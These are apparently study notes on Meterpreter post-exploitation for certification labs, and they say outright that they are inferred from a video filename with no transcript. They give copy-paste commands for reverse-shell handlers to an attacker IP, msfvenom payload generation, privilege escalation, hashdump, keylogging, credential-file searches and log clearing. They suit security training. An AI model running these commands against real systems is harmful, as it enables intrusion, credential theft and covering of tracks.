## What the video covers (Introduction / big picture)
Note: No transcript was provided. The following is a conservative, practice-oriented summary inferred from the filename “01 - Meterpreter Fundamentals.mp4” in the “03-PostExploitationFundamentals” folder.

This video introduces Meterpreter, the in-memory post-exploitation agent used by Metasploit. It covers:
- What Meterpreter is and why it’s used (encrypted, in-memory, flexible, modular).
- How to obtain and manage a Meterpreter session in msfconsole.
- Core Meterpreter commands for host and network enumeration, file operations, process management, and privilege escalation.
- Session stability (migrating to stable processes) and safe interaction with OS shells.
- Using post modules from a Meterpreter session.
- Practical tips for eJPT-style labs (Windows/Linux targets).

## Flow (ordered)
1. Start msfconsole and prepare a handler for a Meterpreter payload.
2. Obtain a session (via exploit or payload execution).
3. List and interact with sessions; background and reattach as needed.
4. Baseline enumeration with Meterpreter (system, user, network).
5. Stabilize access (identify processes and migrate).
6. Privilege escalation attempts (getsystem, token-related actions).
7. File and credential operations (search, download, upload, hashdump).
8. Optional live interaction (shell, keylogger, screenshots).
9. Run relevant post modules.
10. Clean up and session management.

## Tools highlighted
- Metasploit Framework (msfconsole)
- Meterpreter payloads (windows/linux, x86/x64, staged/stageless)
- msfvenom (optional, generate payloads)
- Target OS shells (cmd.exe, /bin/sh) via meterpreter’s shell
- Post modules (post/windows/*, post/multi/*)

## Typical command walkthrough (detailed, copy-paste friendly)

Starter: multi/handler for a reverse TCP Meterpreter (Windows x64 example)
```
msfconsole

use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_ATTACKER_IP>
set LPORT 4444
set ExitOnSession false
exploit -j
```

Optional: generate a payload with msfvenom (deliver via your preferred vector)
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_ATTACKER_IP> LPORT=4444 -f exe -o meter.exe
```

Sessions: list and interact
```
sessions -l
sessions -i 1
```

Meterpreter basics (works on Windows and Linux unless noted)
```
help
sysinfo
getuid
getpid
getprivs
```

Network info
- Windows:
```
ipconfig
arp
```
- Linux:
```
ifconfig
arp
```

Process listing and migration (stabilize your session)
```
ps
# Pick a stable, long-lived user process (e.g., explorer.exe on Windows) and note its PID
migrate <PID>
getuid
```

Privilege escalation (Windows)
```
load priv
getsystem
getuid
```

Token-related (may require incognito; only if available in your build)
```
# If needed/available:
load incognito
list_tokens -u
impersonate_token "DOMAIN\\User"
# Revert later:
rev2self
```

Dump local password hashes (requires SYSTEM; Windows)
```
hashdump
```

Filesystem interaction
```
pwd
ls
cd C:\\Users\\Public
# Download remote file to your current local directory
download "C:\\Windows\\System32\\drivers\\etc\\hosts"
# Upload local file to a remote path
upload /tmp/tool.exe "C:\\Users\\Public\\tool.exe"
# Recursive search for interesting filenames
search -d "C:\\Users" -f *.kdbx -r
search -d "/home" -f *.ssh -r
```

Spawn a system shell (use sparingly; return with exit)
```
shell
whoami
hostname
exit
```

Screenshots and keylogging (if supported/allowed)
```
screenshot
keyscan_start
# ... have the user type ...
keyscan_dump
keyscan_stop
```

Run post modules from Meterpreter (convenience)
```
# Enumerate logged-on users (Windows)
run post/windows/gather/enum_logged_on_users

# Basic local enumeration (multi-platform options vary)
run post/multi/gather/env
```

Run post modules from msfconsole (requires backgrounded session)
```
background
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
```

Session management and cleanup
```
background
sessions -l
sessions -i 1
# Optional log clearing (Windows; use judiciously in labs)
clearev
# Kill one or all sessions if needed
sessions -k 1
sessions -K
```

Reverse HTTPS alternative (more egress-friendly)
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST <YOUR_ATTACKER_IP>
set LPORT 443
set ExitOnSession false
exploit -j
```

Auto-migrate on session open (handler advanced option)
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <YOUR_ATTACKER_IP>
set LPORT 4444
set ExitOnSession false
set AutoRunScript post/windows/manage/migrate
exploit -j
```

## Practical tips
- Prefer matching architecture: use x64 Meterpreter for x64 targets to avoid WOW64 limitations and improve reliability of features like hashdump.
- Stabilize early: migrate into a stable, user-owned process (e.g., explorer.exe) after landing a session.
- Use reverse_https for realistic egress; reverse_tcp is fine for labs.
- Keep handlers alive: ExitOnSession false and run them as jobs (exploit -j) to catch multiple sessions or reconnects.
- Minimal footprint: avoid unnecessary shell spawns; do as much as possible via Meterpreter built-ins.
- Quoting/paths: quote Windows paths with spaces and escape backslashes when needed.
- Post modules: background your session to run post modules in msfconsole with SESSION set.
- OPSEC in labs: clearev and timestomp exist, but use only if the exercise expects it.
- If getsystem fails: check UAC, integrity level, and try different vectors (other local privilege escalation modules) or token impersonation if tokens are available.
- Networking: prefer enumeration via Meterpreter first; pivoting/port forwarding is typically covered later—don’t mix too many features at once in fundamentals.

## Minimal cheat sheet (one-screen flow)
```
# Handler (Windows x64 reverse TCP)
msfconsole
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <ATTACKER_IP>
set LPORT 4444
set ExitOnSession false
exploit -j

# (Optional) Generate payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f exe -o meter.exe

# Sessions
sessions -l
sessions -i 1

# Baseline enum
sysinfo
getuid
ipconfig      # Windows
ifconfig      # Linux
ps

# Stabilize
migrate <PID>

# Priv/escalation (Windows)
load priv
getsystem
hashdump

# Files
pwd && ls
download "C:\\Windows\\System32\\drivers\\etc\\hosts"
upload /tmp/tool.exe "C:\\Users\\Public\\tool.exe"
search -d "C:\\Users" -f *.kdbx -r

# Shell (exit to return)
shell
exit

# Post module (example)
background
use post/windows/gather/enum_logged_on_users
set SESSION 1
run
```

## Summary
Meterpreter Fundamentals centers on getting and effectively using a Meterpreter session for post-exploitation. You learn to set up a handler, manage sessions, enumerate hosts and networks, stabilize access by migrating processes, attempt privilege escalation, interact with the filesystem, and leverage post modules. The commands above provide a concise, copy-paste workflow appropriate for eJPT-style labs, with an emphasis on stability, minimal footprint, and practical enumeration steps.